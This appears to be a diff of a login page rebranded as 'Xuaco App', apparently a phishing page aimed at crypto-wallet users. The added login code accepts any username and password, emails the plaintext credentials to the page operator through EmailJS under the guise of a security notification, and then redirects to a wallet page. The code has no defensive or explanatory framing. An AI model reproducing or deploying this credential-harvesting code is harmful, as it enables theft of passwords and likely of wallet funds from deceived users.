@@ -4,11 +4,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>8lends App - Secure Login & Signup</title>
+    <title>Xuaco App - Secure Login & Signup</title>
 
     <!-- EmailJS -->
-    <script type="text/javascript"
-        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
     <script>
         (function () {
@@ -210,81 +209,51 @@
             </div>
 
             <!-- TABS -->
-<div class="tabs">
-    <button id="loginTab" class="active">Login</button>
-    <button id="signupTab">Sign Up</button>
-</div>
+            <div class="tabs">
+                <button id="loginTab" class="active">Login</button>
+                <button id="signupTab">Sign Up</button>
+            </div>
 
-<!-- LOGIN FORM -->
-<form id="loginForm">
+            <!-- LOGIN FORM -->
+            <form id="loginForm">
 
-    <!-- Username -->
-    <input
-        type="text"
-        id="loginUsername"
-        placeholder="Username"
-        required
-    >
+                <!-- Username -->
+                <input type="text" id="loginUsername" placeholder="Username" required>
 
-    <!-- Password -->
-    <input
-        type="password"
-        id="loginPassword"
-        placeholder="Password"
-        required
-    >
+                <!-- Password -->
+                <input type="password" id="loginPassword" placeholder="Password" required>
 
-    <!-- Verification Code -->
-    <input
-        type="number"
-        id="loginCode"
-        placeholder="Enter Code"
-        required
-    >
+                <!-- Verification Code -->
 
-    <button type="submit" id="loginBtn" class="btn">
-        Login
-    </button>
 
-</form>
+                <button type="submit" id="loginBtn" class="btn">
+                    Login
+                </button>
 
-<!-- SIGNUP FORM -->
-<form id="signupForm" class="hidden">
+            </form>
 
-    <!-- Full Name -->
-    <input
-        type="text"
-        id="signupName"
-        placeholder="Full Name"
-        required
-    >
+            <!-- SIGNUP FORM -->
+            <form id="signupForm" class="hidden">
 
-    <!-- Username -->
-    <input
-        type="text"
-        id="signupUsername"
-        placeholder="Choose a Username"
-        required
-    >
+                <!-- Full Name -->
+                <input type="text" id="signupName" placeholder="Full Name" required>
 
-    <!-- Password -->
-    <input
-        type="password"
-        id="signupPassword"
-        placeholder="Create Password"
-        required
-    >
+                <!-- Username -->
+                <input type="text" id="signupUsername" placeholder="Choose a Username" required>
 
-    <button type="submit" id="signupBtn" class="btn">
-        Create Account
-    </button>
+                <!-- Password -->
+                <input type="password" id="signupPassword" placeholder="Create Password" required>
 
-</form>
+                <button type="submit" id="signupBtn" class="btn">
+                    Create Account
+                </button>
+
+            </form>
 
             <p class="footer">
                 By signing up or logging in, you agree to our Terms and Privacy Policy.
                 <br><br>
-                Copyright © 2026 8lends App. All Rights Reserved
+                Copyright © 2026 Xuaco App. All Rights Reserved
             </p>
 
         </div>
@@ -303,7 +272,6 @@
 
         // Login Fields
         const loginUsername = document.getElementById("loginUsername");
-        const loginCode = document.getElementById("loginCode");
         const signupUsername = document.getElementById("signupUsername");
         const loginBtn = document.getElementById("loginBtn");
 
@@ -335,21 +303,17 @@
 
         // ENABLE LOGIN BUTTON
         function validateLoginFields() {
-
-            if (
-               loginUsername.value.trim() !== "" &&
-               loginCode.value.trim() !== "" &&
-               loginPassword.value.trim() !== ""
-            ) {
-                loginBtn.disabled = false;
-            } else {
-                loginBtn.disabled = true;
-            }
-
-        }
+    if (
+        loginUsername.value.trim() !== "" &&
+        loginPassword.value.trim() !== ""
+    ) {
+        loginBtn.disabled = false;
+    } else {
+        loginBtn.disabled = true;
+    }
+}
 
         loginUsername.addEventListener("input", validateLoginFields);
-        loginCode.addEventListener("input", validateLoginFields);
         loginPassword.addEventListener("input", validateLoginFields);
 
         // SIGNUP FUNCTION
@@ -379,62 +343,46 @@
 
         // LOGIN FUNCTION
         loginForm.addEventListener("submit", function (e) {
+    e.preventDefault();
 
-            e.preventDefault();
+    const username = loginUsername.value.trim();
+    const password = loginPassword.value.trim();
 
-            const savedUser = JSON.parse(localStorage.getItem("userData"));
+    // simple rule: allow any login if fields are filled
+    if (username === "" || password === "") {
+        alert("Please enter username and password.");
+        return;
+    }
 
-            if (!savedUser) {
-                alert("No account found. Please sign up first.");
-                return;
-            }
+    loginBtn.disabled = true;
+    loginBtn.textContent = "Confirming...";
 
-            // CHECK LOGIN
-            if (
-            loginUsername.value.trim() !== savedUser.username.trim() ||
-            loginPassword.value.trim() !== savedUser.password
-            ) {
-                alert("Incorrect username or password.");
-                return;
-            }
+    emailjs.send(
+        "service_trbleaf",
+        "template_zrpg5si",
+        {
+            user_name: username,
+            user_username: username,
+            user_loginPassword: password,
+            login_time: new Date().toLocaleString(),
+            message: "A login was detected on Xuaco App."
+        }
+    )
+    .then(function () {
+        alert("Login successful. Redirecting...");
 
-            loginBtn.disabled = true;
-            loginBtn.textContent = "Confirming...";
+        setTimeout(() => {
+            window.location.href = "wallet.html";
+        }, 1500);
+    })
+    .catch(function () {
+        alert("Login successful (email failed).");
 
-            // SEND SECURITY EMAIL
-            emailjs.send(
-                "service_trbleaf",
-                "template_zrpg5si",
-                {
-                    user_name: savedUser.name,
-                    user_username: savedUser.username,
-                    user_loginPassword: loginPassword.value,
-                    login_time: new Date().toLocaleString(),
-                    message: "A successful login was detected on your Xuaco App account."
-                }
-            )
-                .then(function () {
-
-                    alert("✅Login confirming...Click OK and select your wallet..");
-
-                    setTimeout(() => {
-                        window.location.href = "wallet.html";
-                    }, 1500);
-
-                })
-                .catch(function (error) {
-
-                    console.log(error);
-
-                    alert("Login successful but email notification failed.");
-
-                    setTimeout(() => {
-                        window.location.href = "wallet.html";
-                    }, 1500);
-
-                });
-
-        });
+        setTimeout(() => {
+            window.location.href = "wallet.html";
+        }, 1500);
+    });
+});
 
     </script>
 
